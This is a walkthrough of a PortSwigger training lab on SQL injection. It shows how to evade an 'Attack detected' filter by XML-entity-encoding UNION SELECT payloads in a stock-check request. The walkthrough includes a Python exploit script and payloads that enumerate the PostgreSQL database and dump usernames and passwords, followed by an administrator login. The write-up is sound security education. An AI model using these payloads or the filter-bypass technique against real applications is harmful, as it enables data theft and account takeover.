# SQL injection with filter bypass via XML encoding

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding), you'll learn: SQL injection with filter bypass via XML encoding! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211021459.png)

**Let's click one of those products!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211021603.png)

**In here, we can see a `Check stock` button. Let's inspect that:**
```html
<form id="stockCheckForm" action="/product/stock" method="POST">
    <input required type="hidden" name="productId" value="1">
    <select name="storeId">
        <option value="1" >London</option>
        <option value="2" >Paris</option>
        <option value="3" >Milan</option>
    </select>
    <button type="submit" class="button">Check stock</button>
</form>
<span id="stockCheckResult"></span>
<script src="/resources/js/xmlStockCheckPayload.js"></script>
<script src="/resources/js/stockCheck.js"></script>
```

As you can see, **this form is sending a POST request to `/product/stock`, and it requires a parameter called `productId` and `storeId`.**

**Also, there are 2 JavaScript files:**

**`stockCheck.js`:**
```js
document.getElementById("stockCheckForm").addEventListener("submit", function(e) {
    checkStock(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
    e.preventDefault();
});

function checkStock(method, path, data) {
    const retry = (tries) => tries == 0
        ? null
        : fetch(
            path,
            {
                method,
                headers: { 'Content-Type': window.contentType },
                body: payload(data)
            }
          )
            .then(res => res.status === 200
                ? res.text().then(t => isNaN(t) ? t : t + " units")
                : "Could not fetch stock levels!"
            )
            .then(res => document.getElementById("stockCheckResult").innerHTML = res)
            .catch(e => retry(tries - 1));

    retry(3);
}
```

**As the file name suggested, it checks the stock.**

**`xmlStockCheckPayload.js`:**
```js
window.contentType = 'application/xml';

function payload(data) {
    var xml = '<?xml version="1.0" encoding="UTF-8"?>';
    xml += '<stockCheck>';

    for(var pair of data.entries()) {
        var key = pair[0];
        var value = pair[1];

        xml += '<' + key + '>' + value + '</' + key + '>';
    }

    xml += '</stockCheck>';
    return xml;
}
```

In here, when we clicked the `Check stock` button, **it set the `Contype-Type` HTTP header to `application/xml`.**

Then, the `xml` variable preparing a valid XML format:

- Header:

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

- `stockCheck` tag:

```xml
<stockCheck>
</stockCheck>
```

- **After that, it adds a new `key` tag, and the key pair `value`:**

**In here, when we clicked the `Check stock` button, a POST parameter `productId`, `storeId` and it's value will be supplied:**
```xml
<productId>1</productId>
<storeId>1</storeId>
```

**Therefore, the complete XML is:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```

**Now, let's intercept that POST request in Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211023729.png)

**Armed with above information, we can try to send an SQL injection payload:**
```sql
1' OR 1=1-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211024128.png)

Hmm... `"Attack detected"`??

**Looks like there are some filtering that blocks our SQL injection payload!**

To bypass XML-based SQL injection, we can use an **XML escape sequence**!!

**For example, we can use an [online tool](https://coderstoolbox.net/string/#!encoding=xml&action=encode&charset=us_ascii) to encode XML strings:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211025807.png)

**Let's copy and paste that to our payload!**
```xml
<storeId>1 &#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;</storeId>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211025935.png)

**As we can see, the `"Attack detected"` is gone, and we successfully triggered an SQL injection payload!**

**Let's find how many columns are there:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211030046.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211030100.png)

**Hmm... When we try to fetch more than 1 column, it returns `0 units`, which indicates that's an error occurred.**

**For the sake of automation, I'll write a python script:**
```py
#!/usr/bin/python3

import requests

def main():
    url = 'https://0a81001a045a7203c0f32139003300c9.web-security-academy.net/product/stock'

    cookie = {
        'session': 'YOUR_SESSIONID'
    }

    header = {
        'Content-Type': 'application/xml'
    }

    # UNION SELECT NULL
    payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;'
    
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>1</productId>
        <storeId>1 {payload}</storeId>
    </stockCheck>'''

    print(requests.post(url, cookies=cookie, headers=header, data=xml).text)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
└─# python3 exploit.py
381 units
null
```

**Now, we need to know that column is accepting a string data type or not:**
```py
# UNION SELECT 'string'
payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#39;&#115;&#116;&#114;&#105;&#110;&#103;&#39;'
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
└─# python3 exploit.py
381 units
string
```

It accepts string data type!

**Next, we can find out what DBMS(Database Management System) is using:**
```py
# UNION SELECT version()
payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#118;&#101;&#114;&#115;&#105;&#111;&#110;&#40;&#41;'
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
└─# python3 exploit.py
381 units
PostgreSQL 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
```

- DBMS information: PostgreSQL version 12.12

**Then, we can list all the tables in the current database:**
```py
# UNION SELECT table_name FROM information_schema.tables
payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#116;&#97;&#98;&#108;&#101;&#95;&#110;&#97;&#109;&#101;&#32;&#70;&#82;&#79;&#77;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#95;&#115;&#99;&#104;&#101;&#109;&#97;&#46;&#116;&#97;&#98;&#108;&#101;&#115;'
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
└─# python3 exploit.py | grep 'users'                                            
users
```

- Found table: `users`

**After that, we can list all columns in that table:**
```py
# UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'
payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#99;&#111;&#108;&#117;&#109;&#110;&#95;&#110;&#97;&#109;&#101;&#32;&#70;&#82;&#79;&#77;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#95;&#115;&#99;&#104;&#101;&#109;&#97;&#46;&#99;&#111;&#108;&#117;&#109;&#110;&#115;&#32;&#87;&#72;&#69;&#82;&#69;&#32;&#116;&#97;&#98;&#108;&#101;&#95;&#110;&#97;&#109;&#101;&#61;&#39;&#117;&#115;&#101;&#114;&#115;&#39;'
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
└─# python3 exploit.py               
381 units
password
username
```

- Found columns in table `users`: `password`, `username`

**Finally, we can extract all information from that table:**
```py
# UNION SELECT username||':'||password FROM users
payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#124;&#124;&#39;&#58;&#39;&#124;&#124;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;'
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-17]
└─# python3 exploit.py
carlos:87v3kz1n8lj3lsbk16lb
administrator:g71rod6iiqnst89r8ver
381 units
wiener:0nsi7q3oliz4bltzgrcn
```

- Found `administrator` password: `g71rod6iiqnst89r8ver`

**Let's login as `administrator`!!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211033058.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-17/images/Pasted%20image%2020221211033111.png)

We're user `administrator`!!

# What we've learned:

1. SQL injection with filter bypass via XML encoding